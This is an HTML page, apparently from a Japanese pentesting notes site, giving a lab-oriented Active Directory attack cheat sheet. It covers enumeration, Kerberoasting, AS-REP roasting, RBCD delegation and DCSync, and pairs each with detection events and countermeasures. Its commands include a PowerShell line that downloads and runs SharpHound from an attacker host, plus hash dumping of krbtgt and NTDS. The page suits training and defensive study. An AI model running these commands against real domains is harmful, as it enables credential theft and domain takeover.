@@ -1,0 +1,218 @@
+<!doctype html>
+<html lang="ja">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Active Directory — d0me</title>
+<meta name="description" content="Active Directory 攻略の索引。列挙・Kerberoast・AS-REP・権限委任・DCSync と、対になる検知/対策。">
+<link rel="icon" href="../assets/img/favicon.svg" type="image/svg+xml">
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;500;700&family=Zen+Kaku+Gothic+New:wght@400;500;700&display=swap" rel="stylesheet">
+<link rel="stylesheet" href="../assets/css/sheet.css">
+</head>
+<body>
+
+<header class="topbar">
+  <div class="wrap">
+    <div class="brand"><span class="glyph">[<b data-handle>d0me</b>]</span><span class="tag">索引</span></div>
+    <button class="nav-toggle" aria-label="メニュー">≡</button>
+    <nav class="nav"><a href="../all.html">索引</a><a href="../index.html#certs">資格</a><a href="#" data-gh-url>github</a></nav>
+  </div>
+</header>
+
+<main>
+<section class="sheet-hero">
+  <div class="wrap">
+    <div class="crumb"><a href="/" data-blog>blog</a><span class="sep">/</span><a href="../all.html">索引</a><span class="sep">/</span>壱 · Active Directory</div>
+    <h1><span class="idx">壱</span>Active Directory</h1>
+    <p class="lede">ドメイン参加ホスト上の低権限から、列挙 → Kerberos 悪用 → 権限委任 → ドメイン支配へ至る経路。すべてラボ想定・プレースホルダ。攻撃の要点と防御側の検知/対策を併記する。
+      <span class="jp">前提: 有効なドメイン資格情報を1組保持している状態から開始。</span></p>
+  </div>
+</section>
+
+<div class="wrap">
+<div class="sheet-layout">
+
+  <aside class="toc">
+    <div class="toc-label">目次</div>
+    <ul>
+      <li><a href="#enum">01 列挙 / Enumeration</a></li>
+      <li><a href="#kerberoast">02 Kerberoasting</a></li>
+      <li><a href="#asrep">03 AS-REP Roasting</a></li>
+      <li><a href="#deleg">04 権限委任 / Delegation</a></li>
+      <li><a href="#dcsync">05 DCSync / dump</a></li>
+      <li><a href="#ref">06 参照 / References</a></li>
+    </ul>
+  </aside>
+
+  <article class="doc">
+
+    <!-- 01 -->
+    <section id="enum" class="reveal">
+      <h2><span class="num">01</span>列挙<span class="jp">Enumeration</span></h2>
+      <p>攻撃経路は関係グラフの中にある。まず BloodHound で収集し、Kerberoast 可能なアカウント、危険な ACL、委任設定、到達可能な高権限へのパスを可視化する。</p>
+
+      <h3>BloodHound 収集(リモート)</h3>
+      <div class="code"><div class="code-bar"><span class="code-lang">bash</span><button class="copy">copy</button></div><pre><code><span class="c"># Python collector — ドメイン参加ホスト不要</span>
+bloodhound-python -u '<span class="v">&lt;USER&gt;</span>' -p '<span class="v">&lt;PASS&gt;</span>' \
+  -d <span class="v">&lt;DOMAIN.LOCAL&gt;</span> -ns <span class="v">&lt;DC_IP&gt;</span> -c All --zip</code></pre></div>
+
+      <div class="code"><div class="code-bar"><span class="code-lang">powershell</span><button class="copy">copy</button></div><pre><code><span class="c"># ホスト上から SharpHound（インメモリ実行）</span>
+IEX(New-Object Net.WebClient).DownloadString('http://<span class="v">$LHOST</span>/SharpHound.ps1')
+Invoke-BloodHound -CollectionMethod All -OutputDirectory C:\Windows\Temp</code></pre></div>
+
+      <h3>手早い当たり(NetExec)</h3>
+      <div class="code"><div class="code-bar"><span class="code-lang">bash</span><button class="copy">copy</button></div><pre><code><span class="c"># 資格情報の有効性・管理者範囲・パスワードポリシー</span>
+nxc smb <span class="v">&lt;TARGETS&gt;</span> -u '<span class="v">&lt;USER&gt;</span>' -p '<span class="v">&lt;PASS&gt;</span>'
+nxc smb <span class="v">&lt;DC_IP&gt;</span> -u '<span class="v">&lt;USER&gt;</span>' -p '<span class="v">&lt;PASS&gt;</span>' --pass-pol --users --groups</code></pre></div>
+
+      <div class="defense"><span class="lbl">防御 / countermeasures</span>
+        <ul>
+          <li>大量の LDAP/SAMR クエリ(短時間の全ユーザ・全グループ列挙)を Event ID 1644 や SACL で検知。</li>
+          <li>SharpHound の特徴的な SMB/LDAP バーストと、無署名の一斉接続を EDR/ネットワークで監視。</li>
+        </ul>
+      </div>
+    </section>
+
+    <!-- 02 -->
+    <section id="kerberoast" class="reveal">
+      <h2><span class="num">02</span>Kerberoasting<span class="jp">SPN 付きアカウント</span></h2>
+      <p>SPN が設定されたサービスアカウントの TGS は、そのアカウントの NT ハッシュで暗号化される。任意のドメインユーザが要求でき、オフラインでクラック可能。弱いパスワードのサービスアカウントが本丸。</p>
+
+      <div class="code"><div class="code-bar"><span class="code-lang">bash</span><button class="copy">copy</button></div><pre><code><span class="c"># Impacket — impacket は venv 優先</span>
+GetUserSPNs.py <span class="v">&lt;DOMAIN&gt;</span>/<span class="v">&lt;USER&gt;</span>:'<span class="v">&lt;PASS&gt;</span>' \
+  -dc-ip <span class="v">&lt;DC_IP&gt;</span> -request -outputfile roast.hash</code></pre></div>
+
+      <div class="code"><div class="code-bar"><span class="code-lang">powershell</span><button class="copy">copy</button></div><pre><code><span class="c"># ホスト上から Rubeus</span>
+.\Rubeus.exe kerberoast /nowrap /outfile:roast.hash</code></pre></div>
+
+      <div class="code"><div class="code-bar"><span class="code-lang">bash</span><button class="copy">copy</button></div><pre><code><span class="c"># オフラインクラック（etype 23 = RC4）</span>
+hashcat -m 13100 roast.hash /usr/share/wordlists/rockyou.txt</code></pre></div>
+
+      <div class="note warn"><span class="lbl">注意</span>AES 限定(etype 17/18)のアカウントは <code>-m 19700/19600</code>。RC4 を要求できる場合は「Kerberoast の格下げ」に該当し、それ自体が検知シグナルになる。</div>
+
+      <div class="defense"><span class="lbl">防御 / countermeasures</span>
+        <ul>
+          <li>サービスアカウントは gMSA/長大ランダムパスワードにし、Kerberoast の前提(クラック可能性)を消す。</li>
+          <li>Event ID 4769 で RC4(0x17)の TGS 要求を監視。単一ユーザからの多数 SPN 要求を相関。</li>
+          <li>不要な SPN の棚卸し。特権グループ所属のサービスアカウントを排除。</li>
+        </ul>
+      </div>
+    </section>
+
+    <!-- 03 -->
+    <section id="asrep" class="reveal">
+      <h2><span class="num">03</span>AS-REP Roasting<span class="jp">事前認証なし</span></h2>
+      <p><code>DONT_REQ_PREAUTH</code> が立つアカウントは、事前認証なしで AS-REP を取得でき、そのユーザのハッシュで暗号化された部分をオフラインクラックできる。資格情報不要で列挙できる点が特徴。</p>
+
+      <div class="code"><div class="code-bar"><span class="code-lang">bash</span><button class="copy">copy</button></div><pre><code><span class="c"># ユーザ名リストから（認証不要）</span>
+GetNPUsers.py <span class="v">&lt;DOMAIN&gt;</span>/ -dc-ip <span class="v">&lt;DC_IP&gt;</span> \
+  -usersfile users.txt -no-pass -format hashcat -outputfile asrep.hash
+
+hashcat -m 18200 asrep.hash /usr/share/wordlists/rockyou.txt</code></pre></div>
+
+      <div class="defense"><span class="lbl">防御 / countermeasures</span>
+        <ul>
+          <li>"Kerberos 事前認証を要求しない" フラグを全アカウントで解除(互換目的の残存を棚卸し)。</li>
+          <li>Event ID 4768 で事前認証なしの AS-REQ を監視。</li>
+        </ul>
+      </div>
+    </section>
+
+    <!-- 04 -->
+    <section id="deleg" class="reveal">
+      <h2><span class="num">04</span>権限委任<span class="jp">Delegation</span></h2>
+      <p>委任の誤設定はドメイン支配への近道になりやすい。種別ごとに前提と獲得物が異なる。</p>
+
+      <table>
+        <thead><tr><th>種別</th><th>誤設定</th><th>獲得</th></tr></thead>
+        <tbody>
+          <tr><td>Unconstrained</td><td>委任対象が無制限</td><td>接続してきたユーザの TGT を収集</td></tr>
+          <tr><td>Constrained</td><td>特定 SPN への委任 + プロトコル遷移</td><td>任意ユーザとして対象サービスへ</td></tr>
+          <tr><td>RBCD</td><td>対象の <code>msDS-AllowedToActOnBehalfOfOtherIdentity</code> を書換可</td><td>対象ホストへ任意ユーザとして</td></tr>
+        </tbody>
+      </table>
+
+      <h3>RBCD(書込 ACL がある場合)</h3>
+      <div class="code"><div class="code-bar"><span class="code-lang">bash</span><button class="copy">copy</button></div><pre><code><span class="c"># 制御下のマシンアカウントを RBCD 委任先に設定</span>
+rbcd.py -delegate-from '<span class="v">&lt;FAKE$&gt;</span>' \
+  -delegate-to '<span class="v">&lt;TARGET$&gt;</span>' -action write \
+  <span class="v">&lt;DOMAIN&gt;</span>/<span class="v">&lt;USER&gt;</span>:'<span class="v">&lt;PASS&gt;</span>'
+
+<span class="c"># S4U で対象ホストの管理者チケットを取得</span>
+getST.py -spn cifs/<span class="v">&lt;TARGET.FQDN&gt;</span> \
+  -impersonate Administrator -dc-ip <span class="v">&lt;DC_IP&gt;</span> \
+  <span class="v">&lt;DOMAIN&gt;</span>/'<span class="v">&lt;FAKE$&gt;</span>':'<span class="v">&lt;MACHINE_PASS&gt;</span>'</code></pre></div>
+
+      <div class="note"><span class="lbl">tips</span>マシンアカウント作成は既定で <code>MachineAccountQuota=10</code> に依存。0 の環境では既存の制御アカウントを流用する。</div>
+
+      <div class="defense"><span class="lbl">防御 / countermeasures</span>
+        <ul>
+          <li>特権アカウントを "機密であり委任できない" に設定、Protected Users グループを活用。</li>
+          <li>Unconstrained 委任を DC 以外から排除。<code>MachineAccountQuota=0</code> を既定に。</li>
+          <li><code>msDS-AllowedToActOnBehalfOfOtherIdentity</code> の変更(Event 5136)を監視。</li>
+        </ul>
+      </div>
+    </section>
+
+    <!-- 05 -->
+    <section id="dcsync" class="reveal">
+      <h2><span class="num">05</span>DCSync / ダンプ<span class="jp">資格情報の一括奪取</span></h2>
+      <p>DS-Replication 権限(<code>Replicating Directory Changes All</code>)を持つと、DC のレプリケーションを装って任意アカウントのハッシュを取得できる。ドメイン管理者相当の到達後、または委譲された ACL がある場合に成立。</p>
+
+      <div class="code"><div class="code-bar"><span class="code-lang">bash</span><button class="copy">copy</button></div><pre><code><span class="c"># 特定ユーザのみ</span>
+secretsdump.py <span class="v">&lt;DOMAIN&gt;</span>/'<span class="v">&lt;ADMIN&gt;</span>':'<span class="v">&lt;PASS&gt;</span>'@<span class="v">&lt;DC_IP&gt;</span> \
+  -just-dc-user krbtgt
+
+<span class="c"># ドメイン全体（NTDS）</span>
+secretsdump.py <span class="v">&lt;DOMAIN&gt;</span>/'<span class="v">&lt;ADMIN&gt;</span>':'<span class="v">&lt;PASS&gt;</span>'@<span class="v">&lt;DC_IP&gt;</span> -just-dc</code></pre></div>
+
+      <div class="note warn"><span class="lbl">運用</span>krbtgt ハッシュはゴールデンチケットの素になる。ラボ検証以外での取得・保持は影響が大きい。公開ノートには当然ハッシュ値は載せない。</div>
+
+      <div class="defense"><span class="lbl">防御 / countermeasures</span>
+        <ul>
+          <li>DC 以外からの DS-Replication 要求を Event ID 4662(レプリケーション GUID)で検知。</li>
+          <li>Tier 0 の分離、krbtgt の定期二回ローテーション、特権 ACL の監査。</li>
+        </ul>
+      </div>
+
+      <div class="takeaway"><span class="lbl">要点 / key takeaways</span>
+        <ul>
+          <li>まずグラフ化(BloodHound)。単発コマンドより「到達可能な最短パス」を先に把握する。</li>
+          <li>Kerberos 系(Kerberoast / AS-REP)は<strong>弱いパスワード前提</strong>。gMSA と長大パスワードで前提を崩せる。</li>
+          <li>委任の誤設定は横展開より速くドメイン支配に化ける。ACL 書込権限の有無が分岐点。</li>
+          <li>各手法に 4769 / 4768 / 4662 など固有の監査イベントがある。攻撃の裏返しがそのまま検知になる。</li>
+        </ul>
+      </div>
+    </section>
+
+    <!-- 06 -->
+    <section id="ref" class="reveal">
+      <h2><span class="num">06</span>参照<span class="jp">References</span></h2>
+      <ul>
+        <li>BloodHound — <a href="https://bloodhound.readthedocs.io" target="_blank" rel="noopener">bloodhound.readthedocs.io</a></li>
+        <li>Impacket — <a href="https://github.com/fortra/impacket" target="_blank" rel="noopener">github.com/fortra/impacket</a></li>
+        <li>Rubeus — <a href="https://github.com/GhostPack/Rubeus" target="_blank" rel="noopener">github.com/GhostPack/Rubeus</a></li>
+        <li>NetExec — <a href="https://www.netexec.wiki" target="_blank" rel="noopener">netexec.wiki</a></li>
+        <li>The Hacker Recipes — <a href="https://www.thehacker.recipes" target="_blank" rel="noopener">thehacker.recipes</a></li>
+      </ul>
+    </section>
+
+  </article>
+</div>
+</div>
+</main>
+
+<footer class="foot">
+  <div class="wrap">
+    <div class="sig"><span class="mini-hanko" aria-hidden="true">d0</span><span class="fmeta"><b data-handle>d0me</b> · Active Directory</span></div>
+    <div class="flinks"><a href="../all.html">索引</a><a href="#" data-gh-url>GitHub</a></div>
+    <span class="fmeta">© <span data-year>2026</span> · <span class="mono">CC BY-NC-SA 4.0</span></span>
+  </div>
+</footer>
+
+<script src="../content.js"></script>
+<script src="../assets/js/sheet.js"></script>
+</body>
+</html>
